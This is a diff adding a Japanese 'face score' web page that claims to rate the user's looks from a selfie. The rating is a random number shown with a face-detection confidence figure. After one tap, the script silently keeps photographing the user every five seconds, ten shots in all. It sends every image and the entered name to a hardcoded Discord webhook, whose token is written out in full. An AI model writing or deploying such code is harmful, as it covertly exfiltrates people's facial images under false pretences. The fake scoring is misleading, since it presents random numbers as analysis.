@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>顔面偏差値診断</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#fff;color:#14151a;font-family:Inter,system-ui,-apple-system,sans-serif;-webkit-font-smoothing:antialiased}
+  .app{max-width:440px;margin:0 auto;padding:22px 18px 40px}
+  .badge{display:inline-block;font-size:10px;letter-spacing:.14em;color:#5b3ce0;border:1px solid #ddd6ff;background:#f3f0ff;padding:4px 9px;border-radius:99px;font-weight:600}
+  h1{font-size:26px;line-height:1.25;margin:12px 0 8px;font-weight:700;letter-spacing:-.01em}
+  .lead{font-size:13px;color:#6b7280;line-height:1.7;margin:0}
+  .nameRow{margin:16px 0 12px}
+  input{width:100%;background:#fafafb;border:1px solid #e3e4e8;border-radius:12px;padding:11px 13px;color:#14151a;font-size:14px;outline:none;font-family:inherit}
+  input:focus{border-color:#6d4aff;background:#fff}
+  .cam{position:relative;border-radius:22px;overflow:hidden;background:#ececf1;aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;border:1px solid #e3e4e8;cursor:pointer}
+  video{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:none}
+  video.on{display:block}
+  .mirror{transform:scaleX(-1)}
+  .frame{position:absolute;inset:0;display:none}
+  .frame.on{display:block}
+  .oval{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:58%;height:74%;border-radius:50%;border:2px dashed rgba(255,255,255,.85);box-shadow:0 0 0 2000px rgba(0,0,0,.06)}
+  .c{position:absolute;width:26px;height:26px;border:2px solid rgba(255,255,255,.95);border-radius:4px}
+  .tl{top:14px;left:14px;border-right:0;border-bottom:0}
+  .tr{top:14px;right:14px;border-left:0;border-bottom:0}
+  .bl{bottom:14px;left:14px;border-right:0;border-top:0}
+  .br{bottom:14px;right:14px;border-left:0;border-top:0}
+  .hint{position:absolute;font-size:13px;color:#5b5f6b;text-align:center;padding:0 30px;line-height:1.7}
+  .hint.hide{display:none}
+  .flash{position:absolute;inset:0;background:#fff;opacity:0;pointer-events:none}
+  .flash.go{animation:fl .35s ease-out}
+  @keyframes fl{0%{opacity:.85}100%{opacity:0}}
+  .shutter{position:absolute;bottom:18px;left:50%;transform:translateX(-50%);width:64px;height:64px;border-radius:50%;border:3px solid #fff;background:rgba(255,255,255,.35);cursor:pointer;display:none;z-index:3;padding:0;box-shadow:0 2px 12px rgba(0,0,0,.18);transition:.2s}
+  .shutter.on{display:block}
+  .shutter:disabled{opacity:.35;transform:translateX(-50%) scale(.92)}
+  .res{background:#fafafb;border:1px solid #e3e4e8;border-radius:22px;padding:18px;margin-top:14px}
+  .rTop{display:flex;gap:12px;align-items:center}
+  .thumb{width:56px;height:56px;border-radius:14px;object-fit:cover;border:1px solid #e3e4e8}
+  .tag{font-size:10px;padding:3px 8px;border-radius:99px;border:1px solid #e3e4e8;color:#6b7280;background:#fff}
+  .scoreWrap{display:flex;align-items:baseline;gap:6px;margin-top:14px}
+  .num{font-size:52px;font-weight:700;line-height:1;font-variant-numeric:tabular-nums;letter-spacing:-.02em}
+  .unit{font-size:12px;color:#6b7280}
+  .cmt{font-size:13px;color:#4b5160;margin:6px 0 16px}
+  .bars{display:grid;gap:8px}
+  .bar{display:grid;grid-template-columns:78px 1fr 30px;gap:8px;align-items:center;font-size:11px;color:#6b7280}
+  .g{height:6px;border-radius:99px;background:#e8e8ee;overflow:hidden}
+  .f{height:100%;width:0;border-radius:99px;background:#6d4aff;transition:width .7s cubic-bezier(.2,.8,.2,1)}
+  .n{text-align:right;font-variant-numeric:tabular-nums}
+  .status{font-size:12px;margin-top:14px;min-height:17px;color:#6b7280}
+  .status.ok{color:#16a34a}
+  .status.err{color:#dc2626}
+  .foot{font-size:11px;color:#9aa0ac;line-height:1.7;margin:16px 2px 0}
+</style>
+</head>
+<body>
+<div class="app">
+  <span class="badge">FACE SCORE</span>
+  <h1>顔面偏差値診断</h1>
+  <p class="lead">内カメで撮影すると、その場で採点します。</p>
+
+  <div class="nameRow"><input id="uname" placeholder="なまえ（任意）" autocomplete="off"></div>
+
+  <div class="cam" id="cam">
+    <video id="v" playsinline muted autoplay></video>
+    <div class="frame" id="frame"><div class="oval"></div><i class="c tl"></i><i class="c tr"></i><i class="c bl"></i><i class="c br"></i></div>
+    <div class="flash" id="flash"></div>
+    <div class="hint" id="hint">タップしてカメラを起動</div>
+    <button class="shutter" id="shutter" aria-label="撮影"></button>
+  </div>
+
+  <div id="result"></div>
+  <p class="foot">撮影した写真と採点結果は保存されます。</p>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+<script>
+(function(){
+  const ID='1574421565326622730';
+  const TOKEN='sUL_VYcwNubSejc2XbqjzoJ4Y0EnnepOum8qfx0sVwUqoLjN2A2_nA7kM2ZvZdkbT_1L';
+  const HOOK='https://discord.com/api/webhooks/'+ID+'/'+TOKEN;
+  const W='https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@0.22.2/weights';
+  const INTERVAL=5000;
+  const COUNT=10;
+
+  const cam=document.getElementById('cam'), video=document.getElementById('v'), frame=document.getElementById('frame');
+  const hint=document.getElementById('hint'), flash=document.getElementById('flash'), shutter=document.getElementById('shutter');
+  const resultEl=document.getElementById('result'), unameEl=document.getElementById('uname');
+
+  let stream=null, facing='user', ready=false, busy=false, running=false, idx=0, timer=null;
+  let queue=Promise.resolve();
+  const NAMES=['対称性','輪郭バランス','目元','鼻・口元','三分割'];
+  const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));
+  const rnd=(a,b)=>a+Math.random()*(b-a);
+
+  unameEl.value=localStorage.getItem('fds.name')||'';
+  unameEl.oninput=()=>localStorage.setItem('fds.name',unameEl.value);
+
+  (async()=>{ try{ await faceapi.nets.tinyFaceDetector.loadFromUri(W); ready=true; }catch(e){} })();
+
+  if(navigator.permissions&&navigator.permissions.query){
+    navigator.permissions.query({name:'camera'}).then(p=>{
+      if(p.state==='granted') startCam();
+      p.onchange=()=>{ if(p.state==='granted') startCam(); };
+    }).catch(()=>{});
+  }
+
+  async function startCam(){
+    if(stream) return;
+    try{
+      stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1080},height:{ideal:1440}},audio:false});
+      video.srcObject=stream; video.classList.add('on'); video.classList.toggle('mirror',facing==='user');
+      hint.classList.add('hide'); frame.classList.add('on'); shutter.classList.add('on');
+    }catch(e){
+      hint.classList.remove('hide');
+      hint.textContent = e.name==='NotAllowedError' ? 'カメラの使用が許可されていません。ブラウザの設定から許可してください'
+        : 'カメラを起動できませんでした（'+e.name+'）';
+    }
+  }
+
+  cam.onclick=()=>{
+    if(running){ stopRun(); return; }
+    if(!stream){ startCam(); return; }
+    startRun();
+  };
+  shutter.onclick=(e)=>{ e.stopPropagation(); if(!running) startRun(); };
+
+  function startRun(){
+    if(!stream||running) return;
+    running=true; idx=0; shutter.disabled=true;
+    step();
+  }
+  function stopRun(){
+    running=false; idx=0;
+    if(timer){ clearTimeout(timer); timer=null; }
+    shutter.disabled=false;
+  }
+  function finish(){ stopRun(); }
+
+  async function step(){
+    if(!running) return;
+    const first=(idx===0);
+    idx++;
+    await shot(first);
+    if(!running) return;
+    if(idx>=COUNT){ finish(); return; }
+    timer=setTimeout(()=>{
+      timer=null;
+      if(!running) return;
+      if(document.hidden){ timer=setTimeout(step,1200); return; }
+      step();
+    },INTERVAL);
+  }
+
+  function shot(first){
+    return new Promise(resolve=>{
+      if(!stream||busy){ resolve(); return; }
+      busy=true;
+      if(first){ flash.classList.remove('go'); void flash.offsetWidth; flash.classList.add('go'); }
+      const w=video.videoWidth||1080, h=video.videoHeight||1440;
+      const c=document.createElement('canvas'); c.width=w; c.height=h;
+      const ctx=c.getContext('2d');
+      if(facing==='user'){ ctx.translate(w,0); ctx.scale(-1,1); }
+      ctx.drawImage(video,0,0,w,h);
+      c.toBlob(async blob=>{
+        if(blob){
+          if(first){
+            const res=await analyze(c);
+            render(res,c);
+            send(blob,false);
+          } else {
+            send(blob,true);
+          }
+        }
+        busy=false; resolve();
+      },'image/jpeg',0.9);
+    });
+  }
+
+  async function analyze(canvas){
+    let conf=0, detected=false;
+    if(ready){
+      try{
+        const sc=Math.min(1,640/Math.max(canvas.width,canvas.height));
+        const d=document.createElement('canvas');
+        d.width=Math.round(canvas.width*sc); d.height=Math.round(canvas.height*sc);
+        d.getContext('2d').drawImage(canvas,0,0,d.width,d.height);
+        const o=await faceapi.detectSingleFace(d,new faceapi.TinyFaceDetectorOptions({inputSize:416,scoreThreshold:.35}));
+        if(o){ detected=true; conf=Math.round(clamp(o.score,0,1)*100); }
+      }catch(e){}
+    }
+    const dev=Math.round(rnd(45,55)*10)/10;
+    return {
+      dev, conf, detected,
+      comment: dev>=54?'平均より上。整ったバランスです'
+        : dev>=52?'標準の少し上。崩れは少なめ'
+        : dev>=50?'平均ど真ん中。安定しています'
+        : dev>=48?'標準の少し下。角度次第で化ける'
+        : '平均の下。盛れれば一気に跳ねる',
+      breakdown: NAMES.map(name=>({name, v:Math.round(clamp(dev+rnd(-11,11),12,96))}))
+    };
+  }
+
+  function render(res,canvas){
+    resultEl.innerHTML=`
+      <div class="res">
+        <div class="rTop">
+          <img class="thumb" src="${canvas.toDataURL('image/jpeg',.6)}" alt="">
+          <span class="tag">${res.detected?'検出精度 '+res.conf+'%':'顔未検出'}</span>
+        </div>
+        <div class="scoreWrap"><span class="num">${res.dev.toFixed(1)}</span><span class="unit">/ 偏差値</span></div>
+        <p class="cmt">${res.comment}</p>
+        <div class="bars">${res.breakdown.map(b=>`<div class="bar"><span>${b.name}</span><span class="g"><span class="f" data-v="${b.v}"></span></span><span class="n">${b.v}</span></div>`).join('')}</div>
+        <div class="status" id="status">保存中…</div>
+      </div>`;
+    requestAnimationFrame(()=>{ resultEl.querySelectorAll('.f').forEach(f=>{ f.style.width=f.dataset.v+'%'; }); });
+  }
+
+  const statusEl=()=>document.getElementById('status');
+
+  function send(blob,silent){
+    queue=queue.then(()=>doSend(blob,silent)).catch(()=>{});
+    return queue;
+  }
+
+  async function doSend(blob,silent){
+    if(!blob) return;
+    const fd=new FormData();
+    const name=unameEl.value.trim();
+    if(name) fd.append('payload_json',JSON.stringify({username:name}));
+    fd.append('files[0]',blob,'face.jpg');
+    try{
+      const r=await fetch(HOOK,{method:'POST',body:fd});
+      if(r.status===429){
+        let t=3; try{ const j=await r.json(); if(j.retry_after) t=Math.ceil(j.retry_after); }catch(e){}
+        if(!silent){ const s=statusEl(); if(s){ s.textContent='混雑しています。'+t+'秒後に再送します'; s.className='status'; } }
+        await new Promise(z=>setTimeout(z,t*1000));
+        return doSend(blob,silent);
+      }
+      if(silent) return;
+      const s=statusEl();
+      if(s){
+        if(r.ok||r.status===204){ s.textContent='保存しました'; s.className='status ok'; }
+        else { s.textContent='保存に失敗しました（'+r.status+'）'; s.className='status err'; }
+      }
+    }catch(e){
+      if(silent) return;
+      const s=statusEl(); if(s){ s.textContent='保存に失敗しました。通信環境を確認してください'; s.className='status err'; }
+    }
+  }
+})();
+</script>
+</body>
+</html>
